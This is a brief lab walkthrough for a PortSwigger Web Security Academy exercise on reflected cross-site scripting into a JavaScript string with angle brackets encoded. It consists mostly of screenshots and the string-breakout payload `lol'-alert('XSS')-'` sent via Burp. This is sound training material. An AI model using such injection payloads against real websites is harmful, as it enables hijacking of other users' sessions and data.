# Reflected XSS into a JavaScript string with angle brackets HTML encoded

Lab URL :- `https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-html-encoded`

![image](https://user-images.githubusercontent.com/60841283/182375480-2ebc8cd7-389e-4d56-8555-fdfdbcc43ff9.png)

Normal Search query :- `lol`

![image](https://user-images.githubusercontent.com/60841283/182375656-96c2b7e6-6c8f-4470-a546-e659ad6ce585.png)

Using `'` symbol :- 

![image](https://user-images.githubusercontent.com/60841283/182385052-255ee15d-8a17-4e9c-af2b-41567c206b48.png)

Payload in Burp :- `lol'-alert("XSS")-'`

![image](https://user-images.githubusercontent.com/60841283/182375262-6786ebb7-457f-4252-b3d3-878308472912.png)

![image](https://user-images.githubusercontent.com/60841283/182386281-b8ec4084-ecf1-4468-a7cf-9739bf53ad73.png)
